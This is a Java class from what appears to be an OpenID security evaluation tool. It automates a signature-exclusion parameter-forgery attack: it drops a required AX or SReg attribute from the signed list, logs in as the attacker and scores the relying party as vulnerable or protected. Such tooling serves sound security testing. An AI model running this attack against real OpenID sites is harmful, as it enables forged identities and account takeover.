/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package wsattacker.sso.openid.attacker.evaluation.attack;

import wsattacker.sso.openid.attacker.evaluation.attack.AttackResult;
import wsattacker.sso.openid.attacker.evaluation.attack.Attack;
import wsattacker.sso.openid.attacker.evaluation.attack.AbstractAttack;
import java.util.ArrayList;
import java.util.List;
import wsattacker.sso.openid.attacker.attack.parameter.AttackParameter;
import wsattacker.sso.openid.attacker.attack.parameter.AttackParameterKeeper;
import wsattacker.sso.openid.attacker.attack.parameter.utilities.HttpMethod;
import wsattacker.sso.openid.attacker.config.OpenIdServerConfiguration;
import wsattacker.sso.openid.attacker.controller.ServerController;
import wsattacker.sso.openid.attacker.evaluation.LoginResult;
import wsattacker.sso.openid.attacker.evaluation.ServiceProvider;
import wsattacker.sso.openid.attacker.evaluation.attack.AttackResult.Interpretation;
import wsattacker.sso.openid.attacker.evaluation.attack.AttackResult.Result;

/**
 *
 * @author christiankossmann
 */
public class ParameterForgeryAttack extends AbstractAttack {

    public ParameterForgeryAttack(ServiceProvider serviceProvider) {
        super(serviceProvider);
    }
    
    @Attack
    private AttackResult performParameterForgeryAttack() {
        // clear all parameters and log in
        serverController.getServer().clearParameters();
        LoginResult loginResult = serviceProvider.login(ServiceProvider.User.ATTACKER);
        
        // OpenID Attribute Exchange
        if (keeper.hasParameter("openid.ns.ax")) {
            //System.out.println("OpenID Attribute Exchange 1.0");
            //System.out.println(loginResult.getLogEntryOfToken().getRequest());
            
            // determine protocol version
            AttackParameter extensionNamespaceParameter = keeper.getParameter("openid.ns.ax");
            String extensionNamespace = extensionNamespaceParameter.getValidValue();
            
            if (extensionNamespace.equals("http://openid.net/srv/ax/1.0")) {
                // version 1.0
                
                
                String authenticationRequest = loginResult.getLogEntryOfToken().getRequest();
                String[] authenticationRequestLines = authenticationRequest.split("\n");
                for (String authenticationRequestLine: authenticationRequestLines) {
                    if (authenticationRequestLine.contains("required")) {
                        int indexOfColon = authenticationRequestLine.indexOf(":");
                        String[] requiredParameters = authenticationRequestLine.substring(indexOfColon+1, authenticationRequestLine.length()).split(",");
                        
                        String fromSignatureExcludedParameter = "ax.value." + requiredParameters[0];
                        System.out.println(fromSignatureExcludedParameter);
                        
                        // exclude first required parameter from signed list
                        AttackParameter signedParameter = keeper.getParameter("openid.signed");
                        signedParameter.setAttackValueUsedForSignatureComputation(true);
                        signedParameter.setAttackMethod(HttpMethod.GET);
                        
                        String validSignedParameter = signedParameter.getValidValue();
                        String attackSignedParameter = validSignedParameter.replace(fromSignatureExcludedParameter, "");
                        attackSignedParameter = attackSignedParameter.replace(",,", ",");
                        signedParameter.setAttackValue(attackSignedParameter);
                        
                        AttackParameter sigParameter = keeper.getParameter("openid.sig");
                        sigParameter.setValidMethod(HttpMethod.DO_NOT_SEND);
                        sigParameter.setAttackMethod(HttpMethod.GET);
                        
                        OpenIdServerConfiguration.getAttackerInstance().setPerformAttack(true);
                        
                        loginResult = serviceProvider.loginAndDetermineAuthenticatedUser(ServiceProvider.User.ATTACKER);
                        
                        boolean success = loginResult.getAuthenticatedUser() == ServiceProvider.User.ATTACKER;
                        Result result = success ? Result.SUCCESS : Result.FAILURE;
                        Interpretation interpretation = success ? Interpretation.CRITICAL : Interpretation.PREVENTED;
                        
                        assert isSignatureValid(loginResult) : "Signature is not valid!";
                        
                        return new AttackResult("One required ax parameter is removed from signature.", loginResult, result, interpretation);
                    }
                }
            }
        }
        
        // OpenID Simple Registration Extension 1.0
        else if (keeper.hasParameter("openid.ns.sreg")) {
            // determine protocol version
            AttackParameter extensionNamespaceParameter = keeper.getParameter("openid.ns.sreg");
            String extensionNamespace = extensionNamespaceParameter.getValidValue();
            
            if (extensionNamespace.equals("http://openid.net/sreg/1.0")) {
                // version 1.0
                
                String authenticationRequest = loginResult.getLogEntryOfToken().getRequest();
                String[] authenticationRequestLines = authenticationRequest.split("\n");
                for (String authenticationRequestLine: authenticationRequestLines) {
                    if (authenticationRequestLine.contains("required")) {
                        int indexOfColon = authenticationRequestLine.indexOf(":");
                        String[] requiredParameters = authenticationRequestLine.substring(indexOfColon+1, authenticationRequestLine.length()).split(",");
                        
                        String fromSignatureExcludedParameter = "sreg." + requiredParameters[0];
                        System.out.println(fromSignatureExcludedParameter);
                        
                        // exclude first required parameter from signed list
                        AttackParameter signedParameter = keeper.getParameter("openid.signed");
                        signedParameter.setAttackValueUsedForSignatureComputation(true);
                        signedParameter.setAttackMethod(HttpMethod.GET);
                        
                        String validSignedParameter = signedParameter.getValidValue();
                        String attackSignedParameter = validSignedParameter.replace(fromSignatureExcludedParameter, "");
                        attackSignedParameter = attackSignedParameter.replace(",,", ",");
                        signedParameter.setAttackValue(attackSignedParameter);
                        
                        AttackParameter sigParameter = keeper.getParameter("openid.sig");
                        sigParameter.setValidMethod(HttpMethod.DO_NOT_SEND);
                        sigParameter.setAttackMethod(HttpMethod.GET);
                        
                        OpenIdServerConfiguration.getAttackerInstance().setPerformAttack(true);
                        
                        loginResult = serviceProvider.loginAndDetermineAuthenticatedUser(ServiceProvider.User.ATTACKER);
                        
                        boolean success = loginResult.getAuthenticatedUser() == ServiceProvider.User.ATTACKER;
                        Result result = success ? Result.SUCCESS : Result.FAILURE;
                        Interpretation interpretation = success ? Interpretation.CRITICAL : Interpretation.PREVENTED;
                        
                        assert isSignatureValid(loginResult) : "Signature is not valid!";
                        
                        return new AttackResult("One required sreg parameter is removed from signature.", loginResult, result, interpretation);
                    }
                }
            }
        } 
        
        return new AttackResult("No Extension is used.", loginResult, Result.NOT_PERFORMABLE, AttackResult.Interpretation.NEUTRAL);
    }
}
